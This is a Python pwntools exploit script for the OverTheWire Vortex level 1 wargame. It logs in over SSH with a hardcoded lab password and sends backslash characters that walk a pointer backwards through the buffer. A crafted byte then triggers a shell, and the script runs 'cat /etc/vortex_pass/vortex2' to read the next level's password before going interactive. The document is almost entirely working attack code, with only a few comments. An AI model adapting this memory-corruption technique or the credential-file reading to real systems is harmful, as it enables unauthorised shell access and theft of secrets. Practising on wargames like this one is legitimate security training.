#!/usr/bin/env python3
from pwn import *
import struct, sys, time
if len(sys.argv) > 1 and sys.argv[1]=="-r":
    conn = ssh(host="vortex.labs.overthewire.org", user="vortex1", port=2228, password="Gq#qu3bF3")
    p = conn.process("/vortex/vortex1")
else:
    p = process("./src")

# unsigned char buf[512];
buffer_size = 512

# unsigned char *ptr = buf + (sizeof(buf)/2);
ptr = 256 # buffer_size / 2
# the reason we want to hardcode 256 in is because / will return a float, which cant concat with dec/int
getchar_size = 4
location=ptr+getchar_size+1
payload = "\\" * (ptr + getchar_size+1)
try:
    p.sendline(payload)
    p.sendline('\xca')
    p.sendline('\\')
    p.sendline('\x00')
    time.sleep(1)
    log.success("Retrived SHell!")
    log.info("Password in: /etc/vortex_pass/vortex2")
    p.recv()
    p.sendline("cat /etc/vortex_pass/vortex2")
    log.info("Password: \n")
    p.recv()
    p.interactive()
except:
  print("ERROR!")
